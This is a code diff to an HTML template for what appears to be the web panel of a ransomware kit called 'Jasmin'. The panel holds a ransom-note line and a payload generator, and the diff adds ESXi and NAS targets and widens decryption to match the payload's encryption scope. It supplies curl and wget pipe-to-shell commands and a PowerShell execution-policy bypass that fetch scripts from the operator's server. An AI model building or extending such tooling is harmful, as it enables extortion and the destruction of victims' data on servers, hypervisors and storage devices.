@@ -1,3 +1,4 @@
+{% set srv = request.url_root.rstrip('/') %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -204,6 +205,8 @@ Contact us to obtain the private key and restore your files.</textarea>
   <button class="dt-btn active" onclick="showDT('win')"><i class="fab fa-windows"></i> Windows</button>
   <button class="dt-btn" onclick="showDT('linux')"><i class="fab fa-linux"></i> Linux</button>
   <button class="dt-btn" onclick="showDT('mac')"><i class="fab fa-apple"></i> macOS</button>
+  <button class="dt-btn" onclick="showDT('esxi')"><i class="fas fa-cube"></i> ESXi</button>
+  <button class="dt-btn" onclick="showDT('nas')"><i class="fas fa-server"></i> NAS</button>
 </div>
 <div class="dt-content" id="dt-win">
 <h3>🖥️ Windows 一键解密</h3>
@@ -212,9 +215,9 @@ Contact us to obtain the private key and restore your files.</textarea>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
 :: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
-curl.exe -sL {{ request.url_root }}payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
-:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
+curl.exe -sL {{ srv }}/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
+powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server {{ srv }} -K "{{ aes_key }}"
+:: -Paths 换成要解密的目录；不写则解密全部加密文件（所有磁盘 + 常用用户目录）</pre>
 </div>
 <div class="dt-content" id="dt-linux" style="display:none">
 <h3>🐧 Linux 一键解密</h3>
@@ -222,22 +225,52 @@ powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server {{ request.ur
 <div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
 <pre class="dt-code"># Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
-# 末尾加上要解密的目录；不写则解密当前目录
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"
+# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点）
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"
 
 # 只需解特定目录时，在末尾追加（可多个）
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /data /home</pre>
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}" /data /home</pre>
 </div>
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
 <div class="dt-step"><span>1</span>打开终端</div>
 <div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <pre class="dt-code"># macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl）
-# 末尾加上要解密的目录；不写则解密当前目录
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"
+# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv /Users + 所有真实挂载点）
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"
 
 # 只需解特定目录时，在末尾追加（可多个）
-curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /Users /tmp</pre>
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}" /Users /tmp</pre>
+</div>
+<div class="dt-content" id="dt-esxi" style="display:none">
+<h3>🖥️ VMware ESXi 一键解密</h3>
+<div class="dt-step"><span>1</span>启用 SSH（ESXi 6.x: Host > 管理 > 服务 > TSM-SSH；ESXi 7/8: Host > 操作 > 服务 > 启用安全 Shell）</div>
+<div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到 SSH 终端运行</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> ESXi 为 BusyBox/POSIX 环境，复用 Linux 零依赖脚本；依赖 openssl + od（ESXi 7.0+ 自带）</div>
+<pre class="dt-code"># 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点，
+# 即 /vmfs/volumes 下的各个数据存储）—— 与载荷加密范围完全对齐
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"
+
+# 只需解特定数据存储时，在末尾追加（可多个）
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}" /vmfs/volumes/datastore1
+
+# ESXi 上 curl 不可用时改用 wget
+wget -qO- {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"</pre>
+</div>
+<div class="dt-content" id="dt-nas" style="display:none">
+<h3>🗄️ NAS 一键解密（QNAP / Synology）</h3>
+<div class="dt-step"><span>1</span>启用 SSH（QNAP: 控制台 > 网络和文件服务 > 启用 SSH；Synology: 控制面板 > 终端机和 SNMP > 启用 SSH）</div>
+<div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到 SSH 终端运行</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载加密私钥 → 内存解密 → 执行 → 清理临时文件</div>
+<pre class="dt-code"># 不写目录则解密全部加密文件（数据卷 + 所有真实挂载点）
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"
+
+# 只需解特定数据卷时，在末尾追加（可多个，逗号或空格分隔）
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}" /volume1
+curl -sL {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}" /share/CACHEDEV1_DATA /share/CACHEDEV2_DATA
+
+# 若 NAS 上 curl 不可用，改用 wget（QNAP/Synology 默认都带 wget）
+wget -qO- {{ srv }}/payloads/jasmin_unlock.sh | sh -s {{ srv }} "{{ aes_key }}"</pre>
 </div>
 <div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 在「载荷生成器」点击「生成RSA密钥对」，加密私钥(<code>.pem.enc</code>)与解密脚本会自动部署到 payloads/ 目录；明文私钥与解密口令需登录后台后经「密钥管理」下载</div>
 </section>
